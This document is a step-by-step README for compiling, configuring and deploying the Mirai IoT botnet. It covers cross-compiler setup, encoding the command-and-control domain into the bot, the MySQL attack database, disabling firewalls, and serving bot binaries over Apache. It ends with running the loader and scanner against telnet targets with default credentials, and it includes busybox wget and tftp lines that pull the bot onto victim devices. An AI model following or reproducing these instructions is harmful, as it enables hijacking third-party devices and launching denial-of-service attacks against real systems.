
# Build Mirai botnet

## Overview

The Mirai command and control server (CNC) acquires bots via telnet, which is found enabled and exposed as a vulnerability in copious IoT devices running various forms of embedded Linux. Combined with a default hardware manufacturer login account, Mirai can gain shell access on the device (bot).

```
c:.
1|-loader                                 ← 
 | |-build.sh
 | |-build.debug.sh
 | |-bins
 | | |-dlr.arm, arm7, m68k, mips, mpsl, ppc, sh4, spc, x86
 | |
 | |-src
 | | |-main.c, binary.c, connection.c, server.c, telnet_info.c, util.c
 |   |-headers
 |     |-binary.h, connection.h, server.h, telnet_info.h, util.h              
 |
2|-mirai                                  ← 
 | |-build.sh
 | |-prompt.txt
 | |-bot
 | | |-main.c, attack.c, attack_app.c, attack_gre.c, attack_tcp.c, attack_udp.c
 | | |-checksum.c, killer.c, rand.c, resolv.c, scanner.c, table.c, util.c
 | | |-atack.h, checksum.h, includes.h, killer.h, protocol.h, rand.h
 | | |-resolv.h, scanner.h, table.h, util.h
 | |
 | |-cnc
 | | |-main.go, admin.go, api.go, attack.go, bot.go, clientList.go, constants.go, database.go
 | |
 | |-tools                                ←  
 | | |-badbot.c
 | | |-enc.c
 | | |-nogdb.c
 | | |-scanListen.go
 | | |-single_load.c
 | | |-wget.c
```

## How to build

### 1. Install requirements

```sh
sudo apt-get update -y && apt-get upgrade -y
sudo apt-get install git gcc golang electric-fence mysql-server mysql-client apache2 screen
git clone https://github.com/ifding/mirai-iot-botnet.git
```

### 2. Install and compile the cross-compilers
```sh
sudo mkdir /etc/xcompile
cd /etc/xcompile
sudo su
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2

tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-i686.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-x86_64.tar.bz2

rm *.tar.bz2

mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-i586 i586
mv cross-compiler-i686 i686
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-x86_64 x86_64
```

### 3. Add GoLang paths
vi ~/.bashrc
add the following string at bottom
```sh
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
 
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/Documents/go
```

### 4. Fixing errors

Type this code and see if you get some errors,
get sure you are in this directory --> ../Mirai-Source-code/mirai
```sh
./build.sh debug telnet
```

If you did this command before step 2 & 3 you would get an error about the Mysql and sql-drivers, 
since that's what alot of people have had trouble with. This fixes that.
```sh
source ~/.bashrc
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords
```

### 5. Compile encrypt-script

make sure you're in /mirai/debug

`./enc string changeme.com` <---- (PUT YOUR DOMAIN !!!) if you don't have get one on godaddy or use NO-IP for free use.

```sh

./enc ip 192.168.1.10
XOR'ing 4 bytes of data...
\xE2\x8A\x23\x28
```

### 6. Configuring bot
```sh
vi ../bot/table.c
void table_init(void)
{   // change below 4 lines
    add_entry(TABLE_CNC_DOMAIN, "\xE2\x8A\x23\x28", 4); //cnc.mirai.com
    add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23

    add_entry(TABLE_SCAN_CB_DOMAIN, "\xE2\x8A\x23\x28", 4); // report.mirai.com
    add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);         // 48101
```

### 7. Configuring CNC

Setup database

Now we going to setup the database permissions and users.
If you have iptbales/ip6tables or any firewall install disable it.
```sh
service iptables stop
/etc/ini.d/iptbales stop
```

Create users and permissions
```sh
mysql -uroot -proot
```

Create the database first
```sh
create database mirai;
```

Select the database
```sh
use mirai;
```

Copy and paste this code into your terminal
```sh
CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);
 
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);
 
CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);
```

### 8. Database create users and permissions

Add user to mysql
```c
INSERT INTO users VALUES (NULL, 'root', 'root', 0, 0, 0, 0, -1, 1, 30, '');
exit
```

edit file "main.go"
```sh
vi ../mirai/cnc/main.go
```

line 10 - line 14 set mysql user and pass here
```
const DatabaseAddr string   = "127.0.0.1:3306"
const DatabaseUser string   = "root"
const DatabasePass string   = "root"
const DatabaseTable string  = "mirai"
```

### 9. Restart mysql server

Now, restart mysql server is needed to be sure the tables run with mysql 
```sh
sudo service mysql restart
```

### 10. Build bot and CNC
```sh
cd ../mirai
./build.sh debug telnet
./build.sh release telnet
```

Now your going to have to move the (prompt.txt) file in  ( ../mirai  ) and move into the ../mirai/release folder


### 11. Execute the Mirai IoT Botnet server

Go the ./mirai/release, you will see a compiled file named `cnc`, execute it.
```sh
./cnc
```

### 12. Login CNC
```sh
cat ./Mirai/mirai/cnc/main.go
```
line 19 and 25
tel, err := net.Listen("tcp", "0.0.0.0:23")  //used for login
api, err := net.Listen("tcp", "0.0.0.0:101")   //used for API


Connect CNC via telnet 
```sh
telnet your-cnc-domain 23
telnet localhost
```

### 13. Start the apache server
```sh
service apache2 start
```

### 14. Copy the mirai files to apache source
```sh
cd ./Mirai-Source-Code/mirai/release
sudo mv mirai* /var/www/html
cd /var/www/html
sudo mkdir bins
sudo mv * bins/
sudo rm bins/index.html
ls bins/
```

Open one browser example and type the ip to check the files, or use wget to download on another machine:
```sh
/bin/busybox wget http:Loader_IP:80/bins/mirai.ppc -O dvrHelper
/bin/busybox tftp -g -l dvrHelp -r mirai.ppc Loader_IP
```

### 15. Configuring Loader

```sh
vim ./dlr/main.c

#define HTTP_SERVER utils_inet_addr(127,0,0,1) // CHANGE TO YOUR Loder SERVER IP

vim ./loader/src/main.c
addrs[0] = inet_addr("192.168.0.1");        // CHANGE TO YOUR Loder SERVER IP
addrs[1] = inet_addr("192.168.1.1");        // CHANGE TO YOUR Loder SERVER IP

//CHANGE TO YOUR Loder SERVER IP
if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80, "100.200.100.100")) == NULL)
{
    printf("Failed to initialize server. Aborting\n");
    return 1;
}
```

### 16. Build Loader
```sh
cd ~/Mirai-Source-Code/loader
chmod 777 *
./build.sh

cd release
mv dlr* ~/Mirai-Source-Code/loader/bins
cd ~/Mirai-Source-Code/loader
./build.sh

vi output.txt
192.168.1.10:23 root:

cd ../mirai/tools
vi scanListen.go
go build scanListen.go
mv scanListen ../../loader
cd ../../loader 
cat output.txt | ./loader
./scanListen
```

## Reference

* [Build Mirai botnet (I): Compile Mirai Source](https://www.cdxy.me/?p=746)
* [Build Mirai botnet (II): Bruteforce and DDoS Attack](https://www.cdxy.me/?p=748)
* [https://github.com/Screamfox/-Mirai-Iot-BotNet](https://github.com/Screamfox/-Mirai-Iot-BotNet/blob/master/TUTORIAL.txt)
* [mirai-setup](http://www.nolanzong.com/2017/01/09/mirai-setup/)